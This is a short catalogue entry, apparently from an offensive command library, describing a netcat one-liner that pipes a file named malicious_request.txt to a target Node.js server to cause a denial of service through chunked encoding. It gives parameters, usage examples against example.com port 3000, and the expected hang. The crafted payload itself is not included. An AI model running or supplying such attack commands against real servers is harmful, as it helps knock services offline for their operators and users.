---
id: cmd-nc-chunked
data: cat malicious_request.txt | nc $TARGET_HOST $TARGET_PORT
tags:
  - network
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.976Z'
verified: false
validated: true
submitted: true
---
# nc-send-chunked-request

## Command

```bash
cat malicious_request.txt | nc $TARGET_HOST $TARGET_PORT
```

## Description

This command uses netcat to send a raw HTTP request from a file over TCP to a target Node.js server, exploiting chunked encoding for DoS. It establishes a connection and pipes the payload, causing the server to hang on unbounded reads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `malicious_request.txt` | File containing the crafted HTTP payload | Yes |
| `$TARGET_HOST` | Target server hostname or IP | Yes |
| `$TARGET_PORT` | Target HTTP port (e.g., 3000) | Yes |

## Examples

### Basic Usage

```bash
cat malicious_request.txt | nc example.com 3000
```

### Advanced Usage

```bash
cat malicious_request.txt | nc -v -w 60 example.com 3000
```

> Adds verbose output and 60s timeout.

## Expected Output

Connection established message from nc, followed by hang (no further output as server doesn't respond).

## Related

- [[Related Procedure|Send-Request-to-Node.js-Server]]
